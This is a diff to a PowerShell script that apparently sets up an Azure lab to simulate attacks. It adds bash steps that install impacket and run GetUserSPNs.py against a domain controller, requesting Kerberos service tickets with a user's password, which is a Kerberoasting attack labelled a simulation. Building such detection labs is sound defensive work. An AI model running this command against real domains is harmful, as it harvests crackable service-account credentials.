@@ -701,7 +701,7 @@ $output = Invoke-AzVMRunCommand -ResourceGroupName $resourceGroupName -VMName "m
 # View the full output
 $output.Value | ForEach-Object { $_.Message }
 
-# LDAP Simple Bind 
+# LDAP Simple Bind and Kerberosting attack sim
 # Python script to execute on the Linux VM 
 $PythonScript = @"
 from ldap3 import Server, Connection, ALL, SIMPLE
@@ -742,10 +742,15 @@ $Command = @"
 #!/bin/bash
 export DEBIAN_FRONTEND=noninteractive
 sudo apt-get update -y
-sudo apt-get install -y python3-pip
+sudo apt-get install -y python3-pip python3-venv
+python3 -m pip install --user pipx
+python3 -m pipx ensurepath
+export PATH="`$PATH`:`$HOME/.local/bin"
+python3 -m pipx install impacket
 pip3 install ldap3
 echo "$PythonScript" > /tmp/temp_script.py
 python3 /tmp/temp_script.py
+GetUserSPNs.py -dc-ip 10.0.0.4 odomain.local/candice.kevin:'$adminPassword' -request
 unset DEBIAN_FRONTEND 
 "@
 
